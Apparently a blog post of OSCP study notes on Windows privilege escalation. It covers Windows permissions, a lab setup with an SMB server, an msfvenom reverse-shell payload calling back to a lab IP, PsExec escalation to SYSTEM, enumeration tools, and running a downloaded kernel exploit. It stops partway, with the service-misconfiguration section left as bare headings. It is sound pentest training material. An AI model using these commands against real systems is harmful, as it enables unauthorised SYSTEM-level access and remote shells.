---
title: WINDOWS PRIVILEAGE ESCALATION
date: 2021-08-30 20:30:00 +/-TTTT
categories: [WINDOWS, PRIVILEAGE ESCALATION]
tags: [windows, privileage escalation, pentesting, oscp]     # TAG names should always be lowercase
---



### Windows Privilege Escalation


[**FOLLOW : MANAS RAMESH - Freelance - Bugcrowd | LinkedIn**  
](https://www.linkedin.com/in/manas-ramesh-9a7ba4149 "https://www.linkedin.com/in/manas-ramesh-9a7ba4149")

This is my OSCP Windows privilege escalations notes. The contents are taken from the @tibsec’s udemy course. All credits go to him. Let’s begin.

### **Privilege escalation in windows**

The ultimate goal with privilege escalation is to get SYSTEM / ADMINISTRATOR account access. Privilege escalation can be simple via kernel exploits. otherwise, we have to do more recon with that compromised system. In a lot of cases, may not simply rely on a single misconfiguration. but may require you to think, and combine multiple misconfigurations.

All privilege escalations are effective examples of access control violations. Access control and user permissions are intrinsically linked. When focusing on privilege escalations in Windows, understanding how Windows handles permissions is very important.

### Understanding Permissions in Windows

**User Accounts**

User accounts are used to log into a Windows system. Think of a user account as a collection of settings/preferences bound to a unique identity. The local “Administrator” account is created by default at installation. Several other default user accounts may exist (e.g. Guest) depending on the version of Windows.

**Service Accounts**

Service accounts are (somewhat obviously) used to run services in Windows. Service accounts cannot be used to sign into a Windows system. The SYSTEM account is a default service account that has the highest privileges of any local account in Windows. Other default service accounts include NETWORK SERVICE and LOCAL SERVICE.

**Groups**

User accounts can belong to multiple groups, and groups can have multiple users. Groups allow for easier access control to resources. Regular groups (e.g. Administrators, Users) have a set list of members.

Pseudo groups (e.g. “Authenticated Users”) have a dynamic list of members which changes based on certain interactions.

**Resources**

In Windows, there are multiple types of resource (also known as objects):

-   Files / Directories
-   Registry Entries
-   Services

Whether a user and/or group has permission to perform a certain action on a resource depends on that resource’s access control list (ACL).

**ACLs & ACEs**

Permissions to access a certain resource in Windows are controlled by the access control list (ACL) for that resource. Each ACL is made up of zero or more access control entries (ACEs).

Each ACE defines the relationship between a principal (e.g. a user, group) and certain access rights.

### Lab setup

**Windows 10**

This page has been designed for Windows 10. If you have a copy of Windows 10, feel free to use it. Otherwise, a free (limited) version of Windows 10 can be downloaded as a VM from Microsoft

**Setup**

A setup script has been included in the tools.zip archive. This setup script was written for Windows 10 and has not been tested on other versions of Windows. If you want to perform any of the privilege escalations in the page yourselves, it is recommended that you install Windows 10 and run the setup script.

The script is also available at: [https://github.com/Tib3rius/Windows-PrivEsc-Setup](https://github.com/Tib3rius/Windows-PrivEsc-Setup)

**Initial Configuration**

Once installed, log in using the local administrator account username “IEUser” and password “Passw0rd!”.

Open Powershell as an administrator and run the following command, which enables SMBv1.

> PS> Enable-WindowsOptionalFeature -Online -FeatureName “SMB1Protocol-Client” -All

The VM will need to be restarted after this.

**SMB Server**

On Kali, extract the tools.zip archive to a directory. Change to this directory and run either of the following to set up an SMB server:

> > python3 /usr/share/doc/python3- impacket/examples/smbserver.py tools .

> > python /usr/share/doc/pythonimpacket/examples/smbserver.py tools .

To copy files from Kali to Windows:

> > copy \\192.168.1.11\tools\file.ext file.ext

To copy files from Windows to Kali:

> > copy file.ext \\192.168.1.11\tools\file.ext

**Setup Script**

Copy the setup.bat script to the Windows VM:

> > copy \\192.168.1.11\tools\setup.bat setup.bat

> Open a command prompt as Administrator. Run the setup.bat script: > .\setup.bat

**Setup Script**

After the setup script has completed, restart the VM. The newly created “admin” account will log in automatically. You can log out and log in as the “user” account with the password “password321”.

A writable directory C:\PrivEsc exists for you to copy any tools/executables to, and will be used as such in the page demos.

### Spawning Administrator Shells

**msfvenom**

If we can execute commands with admin privileges, a reverse shell generated by msfvenom works nicely:

> > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f exe -o reverse.exe

This reverse shell can be caught using Netcat or Metasploit’s own multi/handler.

**RDP**

Alternatively, if RDP is available (or we can enable it), we can add our low privileged user to the Administrators group and then spawn an administrator command prompt via the GUI.

> > net localgroup administrators /add

**Admin -> SYSTEM**

To escalate from an admin user to full SYSTEM privileges, you can use the PsExec tool from Windows Sysinternals [(https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

A copy is included in the downloadable tools ZIP archive.

> > .\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe

### Privilege Escalation Tools

Why use tools?

Tools allow us to automate the reconnaissance that can identify potential privilege escalations.

While it is always important to understand what tools are doing, they are invaluable in a time-limited setting, such as an exam.

On this page we will mostly be using winPEAS and Seatbelt, however, you are free to experiment with other tools and decide which you like.

**PowerUp & SharpUp**

PowerUp & SharpUp are very similar tools that hunt for specific privilege escalation misconfiguration.

PowerUp: [https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)

SharpUp: [https://github.com/GhostPack/SharpUp](https://github.com/GhostPack/SharpUp)

Pre-Compiled SharpUp: [https://github.com/r3motecontrol/GhostpackCompiledBinaries/blob/master/SharpUp.exe](https://github.com/r3motecontrol/GhostpackCompiledBinaries/blob/master/SharpUp.exe)

**PowerUp**

To run PowerUp, start a PowerShell session and use dot sourcing to load the script:

> PS> . .\PowerUp.ps1

Run the Invoke-AllChecks function to start checking for common privilege escalation misconfiguration.

> PS> Invoke-AllChecks

**SharpUp**

To run SharpUp, start a command prompt and run the executable:

> > .\SharpUp.exe

SharpUp should immediately start checking for the same misconfigurations as PowerUp.

**Seatbelt**

Seatbelt is an enumeration tool. It contains a number of enumeration checks. It does not actively hunt for privilege escalation misconfigurations, but provides related information for further investigation.

Code: [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)

Pre-Compiled: [https://github.com/r3motecontrol/GhostpackCompiledBinaries/blob/master/Seatbelt.exe](https://github.com/r3motecontrol/GhostpackCompiledBinaries/blob/master/Seatbelt.exe)

To run all checks and filter out unimportant results:

> > .\Seatbelt.exe all To run specific check(s): > .\Seatbelt.exe …

**winPEAS**

winPEAS is a very powerful tool that not only actively hunts for privilege escalation misconfigurations, but highlights them for the user in the results.

[https://github.com/carlospolop/privilege-escalationawesome-scripts-suite/tree/master/winPEAS](https://github.com/carlospolop/privilege-escalationawesome-scripts-suite/tree/master/winPEAS)

winPEAS Before running, we need to add a registry key and then reopen the command prompt:

> > reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

Run all checks while avoiding time-consuming searches:

> > .\winPEASany.exe quiet cmd fast

Run specific check categories:

> > .\winPEASany.exe quiet cmd systeminfo

**accesschk.exe**

AccessChk is an old but still trustworthy tool for checking user access control rights.

You can use it to check whether a user or group has access to files, directories, services, and registry keys.

The downside is more recent versions of the program spawn a GUI “accept EULA” popup window. When using the command line, we have to use an older version that still has an /accepteula command-line option.

### Privilege escalation in various ways

### **Kernel Exploits**

**What is a Kernel?**

Kernels are the core of any operating system.

Think of it as a layer between application software and the actual computer hardware.

The kernel has complete control over the operating system. Exploiting a kernel vulnerability can result in execution as the SYSTEM user.

**Finding Kernel Exploits**

Finding and using kernel exploits is usually a simple process:

1.  Enumerate Windows version/patch level (system info).

2. Find matching exploits (Google, ExploitDB, GitHub).

3. Compile and run.

Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.

**Tools**

Windows Exploit Suggester: [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng) Precompiled Kernel Exploits: [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits) Watson: [https://github.com/rasta-mouse/Watson](https://github.com/rasta-mouse/Watson)

**Privilege Escalation**

(Note: These steps are for Windows 7)

1.  Extract the output of the systeminfo command:

> > systeminfo > systeminfo.txt

2. Run wesng to find potential exploits:

> > python wes.py systeminfo.txt -i ‘Elevation of Privilege’ — exploits-only | less 3.

3. Cross-reference results with compiled exploits: [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

4. Download the compiled exploit for CVE-2018–8210 onto the Windows VM: [https://github.com/SecWiki/windowskernel-exploits/blob/master/CVE-2018-8120/x64.exe](https://github.com/SecWiki/windowskernel-exploits/blob/master/CVE-2018-8120/x64.exe)

5. Start a listener on Kali and run the exploit, providing it with the reverse shell executable, which should run with SYSTEM privileges:

> > .\x64.exe C:\PrivEsc\reverse.exe

### **Service Exploits**

**Services**

Services are simply programs that run in the background, accepting input or performing regular tasks.

If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to command execution with SYSTEM privileges as well.

**Service Commands**

Query the configuration of a service:

> > sc.exe qc <name>

Query the current status of a service:

> > sc.exe query <name>

Modify a configuration option of a service:

> > sc.exe config <name> <option>= <value>

Start/Stop a service:

> > net start/stop <name>

### **Service Misconfigurations**

**1. Insecure Service Properties**

**2. Unquoted Service Path**

**3. Weak Registry Permissions**

**4. Insecure Service Executables**

**5. DLL Hijacking**

Remaining will be published soon
